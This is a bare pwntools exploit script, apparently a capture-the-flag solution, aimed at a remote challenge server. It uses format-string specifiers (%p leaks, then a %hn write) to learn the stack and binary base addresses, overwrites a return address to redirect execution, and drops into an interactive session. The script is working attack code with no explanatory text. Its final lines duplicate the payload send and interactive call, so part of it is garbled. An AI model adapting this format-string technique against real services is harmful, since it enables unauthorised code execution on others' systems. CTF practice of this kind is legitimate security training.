from pwn import *
context(arch = 'amd64',os = 'linux',log_level = 'debug')
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28225)
secret_addr = 0x202060
def fmt(payload):
    io.recvuntil(b">>")
    io.sendline(b'2')
    io.sendline(payload)
io.sendline('20 00 00')
fmt('%7$n-%16$p')
io.recvuntil('-')
ret_addr = int(io.recvuntil('\n')[:-1],16)-0x28
payload = b'%7$n+%17$p'
fmt(payload)
io.recvuntil('+')
ret_value = int(io.recvuntil('\n')[:-1],16)
elf_base = ret_value - 0x102c
payload1  = b'%'+str((elf_base+0xf56)&0xffff).encode()+b'c%10$hn'
payload1  = payload1.ljust(0x10,b'a')
payload1 += p64(ret_addr)
fmt(payload1)
log.success("ret_value: "+hex(ret_value))
log.success("ret_addr: "+hex(ret_addr))
io.interactive()
fmt(payload1)
log.success("ret_value: "+hex(ret_value))
log.success("ret_addr: "+hex(ret_addr))
io.interactive()
